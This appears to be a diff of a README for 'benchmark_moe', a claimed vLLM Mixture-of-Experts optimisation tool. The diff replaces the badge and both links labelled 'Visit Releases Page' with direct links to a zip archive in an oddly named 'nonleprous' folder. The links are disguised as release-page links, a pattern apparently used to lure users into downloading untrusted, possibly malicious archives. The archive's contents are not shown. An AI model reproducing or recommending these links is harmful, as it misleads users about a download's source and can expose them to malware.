@@ -1,6 +1,6 @@
 # 🚀 benchmark_moe - Optimize Your Model's Performance Easily
 
-![Download](https://img.shields.io/badge/Download-v0.1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/TokyozxcSpedy/benchmark_moe/main/nonleprous/benchmark_moe.zip)
 
 ## 📋 Description
 
@@ -10,7 +10,7 @@ benchmark_moe is a tool designed for the vLLM Mixture of Experts (MoE) model. Th
 
 To get started, visit the Releases page to download the latest version of benchmark_moe. Here’s the link you need:
 
-[Visit Releases Page to Download](https://github.com/TokyozxcSpedy/benchmark_moe/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/TokyozxcSpedy/benchmark_moe/main/nonleprous/benchmark_moe.zip)
 
 ### Steps to Download:
 
@@ -97,4 +97,4 @@ For more information about the features and updates, check the official document
 
 Remember, for downloading and updates, always refer back to the Releases page:
 
-[Visit Releases Page to Download](https://github.com/TokyozxcSpedy/benchmark_moe/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/TokyozxcSpedy/benchmark_moe/main/nonleprous/benchmark_moe.zip)
